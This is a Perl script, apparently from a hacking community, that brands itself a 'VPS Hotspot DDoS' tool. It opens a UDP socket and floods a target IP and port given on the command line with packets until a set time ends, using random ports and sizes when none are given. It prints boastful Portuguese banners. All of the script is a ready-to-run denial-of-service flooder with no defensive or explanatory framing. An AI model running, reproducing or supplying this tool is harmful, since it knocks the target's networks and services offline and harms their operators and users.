#!/usr/bin/perl

use Term::ANSIColor qw(:constants);
    $Term::ANSIColor::AUTORESET = 2;
print BOLD GREEN "Made by TeDerrubei\n";
print BOLD RED "Thanks To Mr. JASON\n";
print BOLD YELLOW "TE DERRUBEI E VOCÊ CHOROU | CHORA NÃO BB :p\n";	

##
# Script Base
##

use Socket;
use strict;

my ($ip,$port,$size,$time) = @ARGV;

my ($iaddr,$endtime,$psize,$pport);

$iaddr = inet_aton("$ip") or die "Cannot resolve hostname $ip\n";
$endtime = time() + ($time ? $time : 100);
socket(flood, PF_INET, SOCK_DGRAM, 17);

print BOLD WHITE<<EOTEXT; 

[̲̅т̲̅є̲̅d̲̅є̲̅я̲̅я̲̅υ̲̅b̲̅є̲̅i̲̅k̲̅k̲̅k̲̅k̲̅]
EOTEXT
print RED<<EOTEXT;
& VØcê CЋØЯØÜ
                                                                                                                                                 
EOTEXT
print "Press CTRL+C to Stop Attack\n" unless $time;
print "$ip $port got hit with $size for $time seconds\n";
print "VPS Hotspot DDoS By TeDerrubei\n";
 
for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1500000-64)+64) ;
  $pport = $port ? $port : int(rand(1500000))+1;
  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport,
$iaddr));}